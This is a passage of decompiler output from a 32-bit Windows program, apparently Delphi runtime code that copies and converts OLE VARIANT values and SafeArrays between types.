        sub_4027E8(20, v7);
      if ( SafeArrayGetUBound(psa, v5 + 1, &plUbound) )
        sub_4027E8(20, v8);
      p_rgsabound->cElements = plUbound - p_rgsabound->lLbound + 1;
      ++v5;
      ++p_rgsabound;
      --v4;
    }
    while ( v4 );
  }
  v10 = SafeArrayCreate(0xCu, cDims, &rgsabound);
  if ( !v10 )
    sub_4027E8(18, v9);
  sub_412180(pvargDest, (int)v9);
  pvargDest->vt = 8204;
  pvargDest->lVal = (LONG)v10;
  if ( (int)(cDims - 1) >= 0 )
  {
    v11 = cDims;
    p_lLbound = &rgsabound.lLbound;
    v13 = rgIndices;
    do
    {
      *v13++ = *p_lLbound;
      p_lLbound += 2;
      --v11;
    }
    while ( v11 );
  }
  do
  {
    if ( SafeArrayPtrOfIndex(psa, rgIndices, &ppvData) )
      sub_4027E8(20, v14);
    if ( SafeArrayPtrOfIndex(v10, rgIndices, &v17) )
      sub_4027E8(20, v15);
    v22();
    result = sub_412264(cDims - 1, v16, (int)&savedregs);
  }
  while ( (_BYTE)result );
  return result;
}
// 412360: variable 'v7' is possibly undefined
// 412382: variable 'v8' is possibly undefined
// 4123C3: variable 'v9' is possibly undefined
// 41242C: variable 'v14' is possibly undefined
// 41244B: variable 'v15' is possibly undefined
// 41246C: variable 'v16' is possibly undefined

//----- (00412480) --------------------------------------------------------
int __fastcall sub_412480(int a1, int a2)
{
  return sub_4050B0(a1, a2);
}
// 4050B0: using guessed type int __fastcall sub_4050B0(_DWORD, _DWORD);

//----- (00412494) --------------------------------------------------------
VARIANTARG *__usercall sub_412494@<eax>(VARIANTARG *result@<eax>, int a2@<edx>, int a3@<ecx>)
{
  VARIANTARG *v5; // esi
  unsigned __int16 v6; // bp
  __int16 v7; // bp
  __int16 v8; // bp
  void *v9; // ecx
  void *v10; // ecx
  int v11[5]; // [esp+0h] [ebp-14h] BYREF

  v11[0] = a3;
  v5 = result;
  if ( result != (VARIANTARG *)a2 )
  {
    v6 = *(_WORD *)a2 & 0xFFF;
    sub_412180(result, a3);
    if ( v6 >= 0x10Fu )
    {
      if ( !sub_415EA4(v6, v11) )
        sub_412170(v10);
      return (VARIANTARG *)(*(int (__fastcall **)(int, VARIANTARG *, int))(*(_DWORD *)v11[0] + 40))(a2, v5, a3);
    }
    else
    {
      if ( v6 < 8u )
      {
        result = (VARIANTARG *)a2;
        *(_DWORD *)&v5->vt = *(_DWORD *)a2;
        v5->decVal.Hi32 = *(_DWORD *)(a2 + 4);
        v5->lVal = *(_DWORD *)(a2 + 8);
        v5->cyVal.Hi = *(_DWORD *)(a2 + 12);
        return result;
      }
      v7 = v6 - 20;
      if ( !v7 )
      {
        v5->vt = 20;
        v5->lVal = *(_DWORD *)(a2 + 8);
        result = *(VARIANTARG **)(a2 + 12);
        v5->cyVal.Hi = (LONG)result;
        return result;
      }
      v8 = v7 - 236;
      if ( !v8 )
      {
        v5->vt = 256;
        v5->lVal = 0;
        return (VARIANTARG *)sub_4042C0(&v5->lVal, *(_DWORD *)(a2 + 8));
      }
      if ( v8 == 1 )
      {
        *(_DWORD *)&v5->vt = *(_DWORD *)a2;
        v5->decVal.Hi32 = *(_DWORD *)(a2 + 4);
        v5->lVal = *(_DWORD *)(a2 + 8);
        v5->cyVal.Hi = *(_DWORD *)(a2 + 12);
        return (VARIANTARG *)dword_42CA4C();
      }
      if ( (_BYTE)a3 )
      {
        if ( (*(_BYTE *)(a2 + 1) & 0x20) != 0 )
          return (VARIANTARG *)sub_4122C0(v5, (const VARIANTARG *)a2, (void (*)(void))sub_412480);
        result = (VARIANTARG *)VariantCopyInd(v5, (const VARIANTARG *)a2);
        if ( result )
          sub_412170(v9);
      }
      else
      {
        if ( (*(_WORD *)a2 & 0x2000) != 0 && (*(_WORD *)a2 & 0x4000) == 0 )
          return (VARIANTARG *)sub_4122C0(v5, (const VARIANTARG *)a2, (void (*)(void))sub_412480);
        return (VARIANTARG *)VariantCopy(v5, (const VARIANTARG *)a2);
      }
    }
  }
  return result;
}
// 412555: variable 'v9' is possibly undefined
// 41259F: variable 'v10' is possibly undefined
// 42CA4C: using guessed type int (*dword_42CA4C)(void);
// 412494: using guessed type int var_14[5];

//----- (004125AC) --------------------------------------------------------
VARIANTARG *__usercall sub_4125AC@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>)
{
  return sub_412494(a1, a2, 0);
}

//----- (004125B4) --------------------------------------------------------
VARIANTARG *__usercall sub_4125B4@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>)
{
  return sub_412494(a1, a2, 1);
}

//----- (004125BC) --------------------------------------------------------
_DWORD *__usercall sub_4125BC@<eax>(int a1@<eax>, int a2@<edx>, void *a3@<ecx>)
{
  __int16 v3; // di
  unsigned int v6[2]; // [esp-18h] [ebp-1Ch] BYREF
  int *v7; // [esp-10h] [ebp-14h]
  char *v8; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v8 = 0;
  v3 = (__int16)a3;
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_412744;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  switch ( *(_WORD *)a2 & 0xFFF )
  {
    case 0:
      break;
    case 2:
      *(_QWORD *)(a1 + 8) = *(__int16 *)(a2 + 8);
      break;
    case 3:
      *(_QWORD *)(a1 + 8) = *(int *)(a2 + 8);
      break;
    case 4:
      *(_QWORD *)(a1 + 8) = sub_402A3C(*(float *)(a2 + 8));
      break;
    case 5:
    case 7:
      *(_QWORD *)(a1 + 8) = sub_402A3C(*(double *)(a2 + 8));
      break;
    case 6:
      *(_QWORD *)(a1 + 8) = sub_402A3C((double)*(__int64 *)(a2 + 8) / 10000.0);
      break;
    case 8:
      sub_40448C(&v8, *(_DWORD *)(a2 + 8));
      *(_QWORD *)(a1 + 8) = sub_407C7C((int)v8);
      break;
    case 0xB:
      *(_QWORD *)(a1 + 8) = *(__int16 *)(a2 + 8);
      break;
    case 0x10:
      *(_QWORD *)(a1 + 8) = *(char *)(a2 + 8);
      break;
    case 0x11:
      *(_DWORD *)(a1 + 8) = *(unsigned __int8 *)(a2 + 8);
      *(_DWORD *)(a1 + 12) = 0;
      break;
    case 0x12:
      *(_DWORD *)(a1 + 8) = *(unsigned __int16 *)(a2 + 8);
      *(_DWORD *)(a1 + 12) = 0;
      break;
    case 0x13:
      *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
      *(_DWORD *)(a1 + 12) = 0;
      break;
    case 0x14:
      *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
      *(_DWORD *)(a1 + 12) = *(_DWORD *)(a2 + 12);
      break;
    default:
      sub_412168(a3);
  }
  *(_WORD *)a1 = v3;
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_41274B;
  return sub_40426C(&v8);
}

//----- (00412758) --------------------------------------------------------
OLECHAR **__usercall sub_412758@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>, void *a3@<ecx>)
{
  VARTYPE v3; // bx
  int v5; // ecx
  unsigned int v7[2]; // [esp-18h] [ebp-20h] BYREF
  int *v8; // [esp-10h] [ebp-18h]
  char *v9; // [esp+0h] [ebp-8h] BYREF
  OLECHAR *v10; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v10 = 0;
  v9 = 0;
  v3 = (unsigned __int16)a3;
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_4128BC;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  switch ( (__int16)a3 )
  {
    case 0:
      break;
    case 2:
      a1->iVal = *(_WORD *)(a2 + 8);
      break;
    case 3:
      a1->lVal = *(_DWORD *)(a2 + 8);
      break;
    case 4:
      a1->fltVal = (float)*(__int64 *)(a2 + 8);
      break;
    case 5:
      a1->dblVal = (double)*(__int64 *)(a2 + 8);
      break;
    case 6:
      a1->llVal = (__int64)((double)*(__int64 *)(a2 + 8) * 10000.0);
      break;
    case 7:
      a1->dblVal = (double)*(__int64 *)(a2 + 8);
      break;
    case 8:
      sub_407BF4(&v9, *(_DWORD *)(a2 + 8), *(_DWORD *)(a2 + 12));
      sub_404A4C((int *)&v10, v9);
      sub_41366C(a1, (int)v10, v5);
      break;
    case 11:
      a1->iVal = -(*(_QWORD *)(a2 + 8) != 0i64);
      break;
    case 16:
      a1->bVal = *(_BYTE *)(a2 + 8);
      break;
    case 17:
      a1->bVal = *(_BYTE *)(a2 + 8);
      break;
    case 18:
      a1->iVal = *(_WORD *)(a2 + 8);
      break;
    case 19:
      a1->lVal = *(_DWORD *)(a2 + 8);
      break;
    case 20:
      a1->lVal = *(_DWORD *)(a2 + 8);
      a1->cyVal.Hi = *(_DWORD *)(a2 + 12);
      break;
    default:
      sub_412168(a3);
  }
  a1->vt = v3;
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_4128C3;
  sub_40426C(&v9);
  return sub_404900(&v10);
}
// 412848: variable 'v5' is possibly undefined

//----- (004128D0) --------------------------------------------------------
VARIANTARG *__fastcall sub_4128D0(int a1, int a2)
{
  int v4; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  void *v7; // [esp-8h] [ebp-24h]
  int *v8; // [esp-4h] [ebp-20h]
  void *v9; // [esp+0h] [ebp-1Ch]
  VARIANTARG v10; // [esp+Ch] [ebp-10h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  sub_412178(&v10);
  v8 = &savedregs;
  v7 = &loc_41292A;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_4125AC(&v10, a2);
  dword_42CA48(ExceptionList);
  sub_412950(a1, &v10);
  v4 = (int)v9;
  __writefsdword(0, (unsigned int)v7);
  v9 = &loc_412931;
  return sub_412180(&v10, v4);
}
// 412950: using guessed type int __fastcall sub_412950(_DWORD, _DWORD);
// 42CA48: using guessed type int (__stdcall *dword_42CA48)(_DWORD);

//----- (00412938) --------------------------------------------------------
int __fastcall sub_412938(int a1, _WORD *a2)
{
  int v2; // ebx

  v2 = 0;
  if ( *a2 == 257 )
  {
    sub_4128D0(a1, (int)a2);
    LOBYTE(v2) = 1;
  }
  return v2;
}

//----- (00412950) --------------------------------------------------------
VARIANTARG *__usercall sub_412950@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>)
{
  unsigned __int16 v5; // bx
  void *v6; // ecx
  VARIANTARG *result; // eax
  void *v8; // ecx
  int v9; // ecx
  void *v10; // ecx
  void *v11; // ecx
  int *v12; // eax
  void *v13; // ecx
  unsigned int v14[2]; // [esp-Ch] [ebp-34h] BYREF
  int *v15; // [esp-4h] [ebp-2Ch]
  VARIANTARG pvargDest; // [esp+Ch] [ebp-1Ch] BYREF
  int v17; // [esp+1Ch] [ebp-Ch] BYREF
  int v18; // [esp+20h] [ebp-8h] BYREF
  unsigned __int16 v19; // [esp+24h] [ebp-4h]
  VARTYPE vt; // [esp+26h] [ebp-2h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  vt = a3;
  v5 = a2->vt & 0xFFF;
  v19 = a3 & 0xFFF;
  sub_412180(a1, a3);
  if ( v5 >= 0x10Fu )
  {
    if ( !sub_415EA4(v5, &v17) )
      sub_412170(v13);
    LOWORD(v12) = vt;
    v15 = v12;
    return (VARIANTARG *)(*(int (__fastcall **)(VARIANTARG *, VARIANTARG *, int *))(*(_DWORD *)v17 + 28))(a2, a1, v12);
  }
  else
  {
    switch ( v19 )
    {
      case 0x14u:
        LOWORD(v6) = vt;
        return (VARIANTARG *)sub_4125BC((int)a1, (int)a2, v6);
      case 0x100u:
        LOWORD(v6) = vt;
        result = (VARIANTARG *)sub_412938((int)v6, a2);
        if ( !(_BYTE)result )
        {
          sub_412178(&pvargDest);
          v15 = &savedregs;
          v14[1] = (unsigned int)&loc_412A0E;
          v14[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
          __writefsdword(0, (unsigned int)v14);
          if ( VariantChangeTypeEx(&pvargDest, a2, 0x400u, 0, vt) )
            sub_412168(v8);
          *a1 = pvargDest;
          v9 = (int)v15;
          __writefsdword(0, v14[0]);
          v15 = (int *)&loc_412AD0;
          return sub_412180(&pvargDest, v9);
        }
        break;
      case 0x101u:
        LOWORD(v6) = vt;
        return sub_4128D0((int)v6, (int)a2);
      default:
        if ( v19 >= 0x10Fu )
        {
          if ( !sub_415EA4(v19, &v18) )
            sub_412170(v11);
          return (VARIANTARG *)(*(int (__fastcall **)(VARIANTARG *, VARIANTARG *))(*(_DWORD *)v18 + 24))(a2, a1);
        }
        else if ( v5 == 20 )
        {
          LOWORD(v6) = vt;
          return (VARIANTARG *)sub_412758(a1, (int)a2, v6);
        }
        else
        {
          LOWORD(v6) = vt;
          result = (VARIANTARG *)sub_412938((int)v6, a2);
          if ( !(_BYTE)result )
          {
            result = (VARIANTARG *)VariantChangeTypeEx(a1, a2, 0x400u, 0, vt);
            if ( result )
              sub_412168(v10);
          }
        }
        break;
    }
  }
  return result;
}
// 4129AD: variable 'v6' is possibly undefined
// 4129EA: variable 'v8' is possibly undefined
// 412A7E: variable 'v10' is possibly undefined
// 412AA3: variable 'v11' is possibly undefined
// 412ABC: variable 'v12' is possibly undefined
// 412ACB: variable 'v13' is possibly undefined

//----- (00412AD8) --------------------------------------------------------
char *__usercall sub_412AD8@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>)
{
  int v3; // ecx
  char *result; // eax
  char *v5; // [esp+4h] [ebp-4h] BYREF

  v5 = 0;
  sub_404FF8(*(const WCHAR **)(a2 + 8), &v5);
  sub_412180(a1, v3);
  a1->vt = 256;
  result = v5;
  a1->lVal = (LONG)v5;
  return result;
}
// 412AF1: variable 'v3' is possibly undefined

//----- (00412B08) --------------------------------------------------------
VARIANTARG *__usercall sub_412B08@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>)
{
  int v3; // esi
  int v4; // ecx
  VARIANTARG *result; // eax

  v3 = sub_40501C(*(const CHAR **)(a2 + 8));
  result = sub_412180(a1, v4);
  a1->vt = 8;
  a1->lVal = v3;
  return result;
}
// 412B18: variable 'v4' is possibly undefined

//----- (00412B30) --------------------------------------------------------
VARIANTARG *__usercall sub_412B30@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>)
{
  VARTYPE vt; // bx
  __int16 v5; // si
  int v7; // ecx
  int v8; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-30h] BYREF
  void *v10; // [esp-8h] [ebp-2Ch]
  int *v11; // [esp-4h] [ebp-28h]
  VARIANTARG v12; // [esp+Ch] [ebp-18h] BYREF
  int v13; // [esp+1Ch] [ebp-8h]
  VARIANTARG *v14; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v13 = a3;
  v14 = a2;
  vt = a2->vt;
  v5 = a3;
  sub_412180(a1, a3);
  if ( v5 == vt )
    return sub_4125AC(a1, (int)v14);
  if ( vt == 256 )
  {
    if ( v5 == 8 )
    {
      return sub_412B08(a1, (int)v14);
    }
    else
    {
      sub_412178(&v12);
      v11 = &savedregs;
      v10 = &loc_412BC5;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      sub_412B08(&v12, (int)v14);
      sub_412950(a1, &v12, v5);
      v7 = (int)v11;
      __writefsdword(0, (unsigned int)ExceptionList);
      v11 = (int *)&loc_412C44;
      return sub_412180(&v12, v7);
    }
  }
  else if ( v5 != 256 || vt == 257 )
  {
    return sub_412950(a1, v14, v5);
  }
  else if ( vt == 8 )
  {
    return (VARIANTARG *)sub_412AD8(a1, (int)v14);
  }
  else
  {
    sub_412178(&v12);
    v11 = &savedregs;
    v10 = &loc_412C31;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    sub_412950(&v12, v14, 8);
    sub_412AD8(a1, (int)&v12);
    v8 = (int)v11;
    __writefsdword(0, (unsigned int)ExceptionList);
    v11 = (int *)&loc_412C44;
    return sub_412180(&v12, v8);
  }
}

//----- (00412C4C) --------------------------------------------------------
VARIANTARG *__usercall sub_412C4C@<eax>(VARIANTARG *a1@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>)
{
  unsigned __int16 v6; // si
  void *v8; // ecx
  int v9[5]; // [esp+0h] [ebp-14h] BYREF

  v9[0] = a3;
  if ( a3 >= 256 )
    sub_412168((void *)a3);
  v6 = a2->vt & 0xFFF;
  sub_412180(a1, a3);
  if ( v6 < 0x10Fu )
    return sub_412B30(a1, a2, a3);
  if ( !sub_415EA4(v6, v9) )
    sub_412168(v8);
  return (VARIANTARG *)(*(int (__fastcall **)(VARIANTARG *, VARIANTARG *, int))(*(_DWORD *)v9[0] + 28))(a2, a1, a3);
}
// 412CA7: variable 'v8' is possibly undefined
// 412C4C: using guessed type int var_14[5];

//----- (00412CB4) --------------------------------------------------------
int __usercall sub_412CB4@<eax>(VARIANTARG *a1@<eax>)
{
  int result; // eax
  VARIANTARG v3; // [esp+0h] [ebp-14h] BYREF

  switch ( a1->vt )
  {
    case 2u:
      result = a1->iVal;
      break;
    case 3u:
      result = a1->lVal;
      break;
    case 4u:
      result = sub_402A3C(a1->fltVal);
      break;
    case 5u:
      result = sub_402A3C(a1->dblVal);
      break;
    case 6u:
      result = sub_402A3C((double)a1->llVal / 10000.0);
      break;
    case 0x10u:
      result = a1->cVal;
      break;
    case 0x11u:
      result = a1->bVal;
      break;
    case 0x12u:
      result = a1->uiVal;
      break;
    case 0x13u:
      result = a1->lVal;
      break;
    case 0x14u:
      result = a1->lVal;
      break;
    default:
      sub_412178(&v3);
      sub_412B30(&v3, a1, 3);
      result = v3.lVal;
      break;
  }
  return result;
}

//----- (00412D90) --------------------------------------------------------
__int64 __usercall sub_412D90@<edx:eax>(VARIANTARG *a1@<eax>)
{
  __int64 iVal; // [esp+0h] [ebp-1Ch]
  VARIANTARG v4; // [esp+8h] [ebp-14h] BYREF

  switch ( a1->vt )
  {
    case 2u:
      iVal = a1->iVal;
      break;
    case 3u:
      iVal = a1->lVal;
      break;
    case 4u:
      iVal = sub_402A3C(a1->fltVal);
      break;
    case 5u:
      iVal = sub_402A3C(a1->dblVal);
      break;
    case 6u:
      iVal = sub_402A3C((double)a1->llVal / 10000.0);
      break;
    case 0x10u:
      iVal = a1->cVal;
      break;
    case 0x11u:
      iVal = a1->bVal;
      break;
    case 0x12u:
      iVal = a1->uiVal;
      break;
    case 0x13u:
      iVal = a1->cyVal.Lo;
      break;
    case 0x14u:
      iVal = a1->llVal;
      break;
    default:
      sub_412178(&v4);
      sub_412B30(&v4, a1, 3);
      iVal = v4.lVal;
      break;
  }
  return iVal;
}

//----- (00412EDC) --------------------------------------------------------
BOOL __usercall sub_412EDC@<eax>(VARIANTARG *a1@<eax>)
{
  VARIANTARG v3; // [esp+0h] [ebp-14h] BYREF

  if ( a1->vt == 11 )
    return a1->iVal != 0;
  sub_412178(&v3);
  sub_412B30(&v3, a1, 11);
  return v3.iVal != 0;
}

//----- (00412F18) --------------------------------------------------------
double __usercall sub_412F18@<st0>(VARIANTARG *a1@<eax>)
{
  double iVal; // [esp+0h] [ebp-2Ch]
  VARIANTARG v4; // [esp+Ah] [ebp-22h] BYREF

  switch ( a1->vt )
  {
    case 2u:
      iVal = (double)a1->iVal;
      break;
    case 3u:
      iVal = (double)a1->lVal;
      break;
    case 4u:
      iVal = a1->fltVal;
      break;
    case 5u:
      iVal = a1->dblVal;
      break;
    case 6u:
      iVal = (double)a1->llVal / 10000.0;
      break;
    case 7u:
      iVal = a1->dblVal;
      break;
    case 0x10u:
      iVal = (double)a1->cVal;
      break;
    case 0x11u:
      iVal = (double)a1->bVal;
      break;
    case 0x12u:
      iVal = (double)a1->uiVal;
      break;
    case 0x13u:
      iVal = (double)a1->cyVal.Lo;
      break;
    case 0x14u:
      iVal = (double)a1->llVal;
      break;
    default:
      sub_412178(&v4);
      sub_412B30(&v4, a1, 5);
      iVal = v4.dblVal;
      break;
  }
  return iVal;
}

//----- (00413054) --------------------------------------------------------
double __usercall sub_413054@<st0>(VARIANTARG *a1@<eax>)
{
  LONGLONG llVal; // [esp+0h] [ebp-28h]
  VARIANTARG v4; // [esp+8h] [ebp-20h] BYREF

  switch ( a1->vt )
  {
    case 2u:
      llVal = (__int64)((double)a1->iVal * 10000.0);
      break;
    case 3u:
      llVal = (__int64)((double)a1->lVal * 10000.0);
      break;
    case 4u:
      llVal = (__int64)(a1->fltVal * 10000.0);
      break;
    case 5u:
      llVal = (__int64)(a1->dblVal * 10000.0);
      break;
    case 6u:
      llVal = a1->llVal;
      break;
    case 0x10u:
      llVal = (__int64)((double)a1->cVal * 10000.0);
      break;
    case 0x11u:
      llVal = (__int64)((double)a1->bVal * 10000.0);
      break;
    case 0x12u:
      llVal = (__int64)((double)a1->uiVal * 10000.0);
      break;
    case 0x13u:
      llVal = (__int64)((double)a1->cyVal.Lo * 10000.0);
      break;
    case 0x14u:
      llVal = (__int64)((double)a1->llVal * 10000.0);
      break;
    default:
      sub_412178(&v4);
      sub_412B30(&v4, a1, 6);
      llVal = v4.llVal;
      break;
  }
  return (double)llVal;
}

//----- (004131C8) --------------------------------------------------------
VARIANTARG *__usercall sub_4131C8@<eax>(volatile __int32 *a1@<eax>, VARIANTARG *a2@<edx>)
{
  int v5; // ecx
  unsigned int v6[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v7; // [esp-4h] [ebp-1Ch]
  VARIANTARG v8; // [esp+8h] [ebp-10h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  if ( a2->vt == 256 )
    return (VARIANTARG *)sub_4042C0(a1, a2->lVal);
  sub_412178(&v8);
  v7 = &savedregs;
  v6[1] = (unsigned int)&loc_41322C;
  v6[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_412B30(&v8, a2, 256);
  sub_4042C0(a1, v8.lVal);
  v5 = (int)v7;
  __writefsdword(0, v6[0]);
  v7 = (int *)&loc_413233;
  return sub_412180(&v8, v5);
}

//----- (0041323C) --------------------------------------------------------
_DWORD *__usercall sub_41323C@<eax>(_BYTE *a1@<eax>, VARIANTARG *a2@<edx>)
{
  unsigned int v4[2]; // [esp-10h] [ebp-14h] BYREF
  int *v5; // [esp-8h] [ebp-Ch]
  char *v6; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_41327F;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_4131C8((volatile __int32 *)&v6, a2);
  sub_404500(a1, v6, 255);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_413286;
  return sub_40426C(&v6);
}

//----- (0041328C) --------------------------------------------------------
void __usercall sub_41328C(OLECHAR **a1@<eax>, VARIANTARG *a2@<edx>)
{
  int v4; // ecx
  unsigned int v5[2]; // [esp-Ch] [ebp-24h] BYREF
  int *v6; // [esp-4h] [ebp-1Ch]
  VARIANTARG v7; // [esp+8h] [ebp-10h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  if ( a2->vt == 8 )
  {
    sub_404A10(a1, a2->bstrVal);
  }
  else
  {
    sub_412178(&v7);
    v6 = &savedregs;
    v5[1] = (unsigned int)&loc_4132EF;
    v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v5);
    sub_412B30(&v7, a2, 8);
    sub_404A10(a1, v7.bstrVal);
    v4 = (int)v6;
    __writefsdword(0, v5[0]);
    v6 = (int *)&loc_4132F6;
    sub_412180(&v7, v4);
  }
}

//----- (004132FC) --------------------------------------------------------
VARIANTARG *__usercall sub_4132FC@<eax>(_DWORD *a1@<eax>, int a2@<edx>)
{
  void *v4; // ecx
  int v5; // ecx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v8; // [esp-8h] [ebp-20h]
  int *v9; // [esp-4h] [ebp-1Ch]
  void *v10; // [esp+0h] [ebp-18h]
  VARIANTARG v11; // [esp+8h] [ebp-10h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  sub_412178(&v11);
  v9 = &savedregs;
  v8 = &loc_41335D;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_4125AC(&v11, a2);
  dword_42CA48(ExceptionList);
  if ( v11.vt != 13 )
    sub_412168(v4);
  sub_405F58(a1, v11.lVal);
  v5 = (int)v10;
  __writefsdword(0, (unsigned int)v8);
  v10 = &loc_413364;
  return sub_412180(&v11, v5);
}
// 413338: variable 'v4' is possibly undefined
// 42CA48: using guessed type int (__stdcall *dword_42CA48)(_DWORD);

//----- (0041336C) --------------------------------------------------------
VARIANTARG *__usercall sub_41336C@<eax>(_DWORD *a1@<eax>, unsigned __int16 *a2@<edx>, int *a3@<ecx>)
{
  unsigned int v4; // eax
  bool v5; // cf
  unsigned int v6; // eax
  unsigned int v7; // eax
  unsigned int v8; // eax
  VARIANTARG *result; // eax
  void *v10; // ecx
  _DWORD *v11; // eax
  int *v12; // [esp+0h] [ebp-Ch] BYREF

  v12 = a3;
  v4 = *a2;
  if ( v4 > 0x101 )
  {
    v8 = v4 - 16393;
    if ( !v8 || v8 == 4 )
      return (VARIANTARG *)sub_405F58(a1, **((_DWORD **)a2 + 2));
  }
  else
  {
    if ( v4 == 257 )
      return sub_4132FC(a1, (int)a2);
    v5 = v4 == 0;
    v6 = v4 - 1;
    if ( v5 )
      return (VARIANTARG *)sub_405F40(a1);
    v7 = v6 - 8;
    if ( !v7 || v7 == 4 )
      return (VARIANTARG *)sub_405F58(a1, *((_DWORD *)a2 + 2));
  }
  if ( !sub_415EA4(*a2, &v12)
    || (v11 = sub_405F40(a1), result = (VARIANTARG *)sub_4035E8(v12, dword_413400, v11), !(_BYTE)result) )
  {
    sub_412168(v10);
  }
  return result;
}
// 4133F4: variable 'v10' is possibly undefined
// 413400: using guessed type int dword_413400[2];

//----- (00413410) --------------------------------------------------------
_DWORD *__usercall sub_413410@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int *a3@<ecx>)
{
  _DWORD *result; // eax
  char v5; // al
  void *v6; // ecx
  _DWORD *v7; // eax
  int *v8; // [esp+0h] [ebp-Ch] BYREF

  v8 = a3;
  switch ( *(_WORD *)a2 )
  {
    case 0:
      return sub_405F40(a1);
    case 9:
      return sub_405F58(a1, *(_DWORD *)(a2 + 8));
    case 0x4009:
      return sub_405F58(a1, **(_DWORD **)(a2 + 8));
  }
  v5 = sub_415EA4(*(_WORD *)a2, &v8);
  if ( !v5 || (v7 = sub_405F40(a1), result = sub_4035E8(v8, dword_413484, v7), !(_BYTE)result) )
    sub_412168(v6);
  return result;
}
// 413479: variable 'v6' is possibly undefined
// 413484: using guessed type int dword_413484[2];

//----- (00413494) --------------------------------------------------------
int *__usercall sub_413494@<eax>(int *a1@<eax>, int a2@<edx>, __int32 a3@<ecx>)
{
  int *result; // eax
  void *v4; // ecx

  result = sub_415928(a1, a2, a3);
  if ( !result )
    sub_412168(v4);
  return result;
}
// 41349D: variable 'v4' is possibly undefined

//----- (004134A4) --------------------------------------------------------
VARIANTARG *__usercall sub_4134A4@<eax>(VARIANTARG *result@<eax>, VARIANTARG *a2@<edx>, int a3@<ecx>)
{
  VARIANTARG *v5; // ebx

  v5 = result;
  if ( result->vt >= 8u )
    result = sub_412180(result, a3);
  switch ( a3 )
  {
    case -3:
    case 0:
    case 3:
      v5->vt = 10;
      break;
    case -2:
      v5->vt = 2;
      v5->iVal = (__int16)a2;
      break;
    case -1:
      v5->vt = 16;
      result = a2;
      v5->bVal = (unsigned __int8)a2;
      break;
    case 1:
      v5->vt = 17;
      result = a2;
      v5->bVal = (unsigned __int8)a2;
      break;
    case 2:
      v5->vt = 18;
      v5->iVal = (__int16)a2;
      break;
    case 4:
      v5->vt = 19;
      v5->lVal = (LONG)a2;
      break;
    default:
      v5->vt = 3;
      v5->lVal = (LONG)a2;
      break;
  }
  return result;
}

//----- (00413534) --------------------------------------------------------
VARIANTARG *__usercall sub_413534@<eax>(VARIANTARG *result@<eax>, LONG a2@<edx>, int a3@<ecx>)
{
  VARIANTARG *v4; // ebx

  v4 = result;
  if ( result->vt >= 8u )
    result = sub_412180(result, a3);
  v4->vt = 3;
  v4->lVal = a2;
  return result;
}

//----- (00413554) --------------------------------------------------------
LONG __userpurge sub_413554@<eax>(VARIANTARG *a1@<eax>, int a2@<ecx>, LONG a3, LONG a4)
{
  LONG result; // eax

  if ( a1->vt >= 8u )
    sub_412180(a1, a2);
  a1->vt = 20;
  a1->lVal = a3;
  result = a4;
  a1->cyVal.Hi = a4;
  return result;
}

//----- (00413580) --------------------------------------------------------
int __usercall sub_413580@<eax>(VARIANTARG *a1@<eax>, char a2@<dl>, int a3@<ecx>)
{
  int result; // eax

  if ( a1->vt >= 8u )
    sub_412180(a1, a3);
  a1->vt = 11;
  result = -(a2 != 0);
  a1->iVal = result;
  return result;
}

//----- (004135A8) --------------------------------------------------------
VARIANTARG *__usercall sub_4135A8@<eax>(VARIANTARG *result@<eax>, int a2@<ecx>, DOUBLE a3@<st0>)
{
  VARIANTARG *v3; // [esp-4h] [ebp-4h]

